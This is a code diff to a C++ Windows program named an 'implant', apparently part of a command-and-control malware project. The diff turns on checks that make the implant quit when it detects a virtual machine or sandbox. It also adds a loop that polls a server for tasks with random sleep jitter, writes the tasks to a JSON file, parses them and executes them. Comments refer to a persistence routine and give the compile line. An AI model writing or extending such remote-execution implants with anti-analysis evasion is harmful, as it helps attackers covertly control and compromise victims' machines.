@@ -12,7 +12,7 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 
 #include "persist/persist.h"
 #include "parse/parse.h"
-//#include "Feiyu/sandbox_detection.h"
+#include "Feiyu/sandbox_detection.h"
 #include "execute/execute.h"
 
 // current compile line is - g++ implant.cpp persist/persist.cpp parse/parse.cpp -lwinhttp -lbcrypt -static -o implant.exe 
@@ -229,17 +229,6 @@ std::string makeHttpRequest(std::string fqdn, int port, std::string uri, int imp
     return result;
 }
 
-// -> PARSE TASK IS FINISHED IN PARSE.CPP
-// auto parseTasks(auto toParse){
-
-// return 1;
-// }
-
-// TODO
-//  auto executeTasks(auto tasks){
-
-//     return 1;
-// }
 
 std::string getTasks(int implant_id)
 {
@@ -342,12 +331,12 @@ void runLoop(int implant_id)
     // PREFERABLY DO NOT TEST THIS ON YOUR MACHINE
     //persist_execution();
 
-    //THIS IS FOR SANDBOX DETECTION TO RUN ONCE
-    // WE NEED ONE IMPLANT COMPILE WITH THIS AND ONE IMPLANT COMPILE WITHOUT IT
-    // 	struct stat buffer;
-    // 	if (vmCheck() || vmDriverCheck() || sandboxTimeCheck()) {
-    // 		MessageBoxW(NULL, L"Running in vm", L"Not good", MB_OK | MB_ICONERROR);
-    // 		exit(0);
+    // THIS IS FOR SANDBOX DETECTION TO RUN ONCE
+    // WE NEED ONE IMPLANT COMPILE WITH THIS AND ONE IMPLANT COMPILE WITHOUT IT	
+    if (vmCheck() || vmDriverCheck() || sandboxTimeCheck()) {
+    	exit(0);
+    }
+
     while (true)
     {
         try
@@ -358,22 +347,21 @@ void runLoop(int implant_id)
                 i=0;
             }
 
-            // WAS FOR TESTING PURPOSES - CHANGE LATER
             std::string getting = getTasks(implant_id);
+      
             jitter = rand() * 10;
             Sleep(SLEEP + jitter);
-            std::cout << getting << std::endl;
-            // WHEN WE GET THE FORMAT, THEN PARSE
-            // THEN AFTER PARSE FEED INTO EXECUTE
-            
-            while(true){
-            // loops
-            // execute(command from post request, args from post request, outputs for our response);
-            }
+            json commands = json::parse(getting);
+            std::string jsonfile = "execute.json";
+            std::ofstream o(jsonfile);
+            o << commands << std::endl;
+            o.close();
 
-            // const auto serverResponse = std::async(std::launch::async, getTasks);
-            // auto parsedTasks = parseTasks(serverResponse.get());
-            // auto success = executeTasks(parsedTasks);
+            parseTasks(jsonfile);
+
+            executecommandfromfile();
+
+
         }
         catch (const std::exception &e)
         {
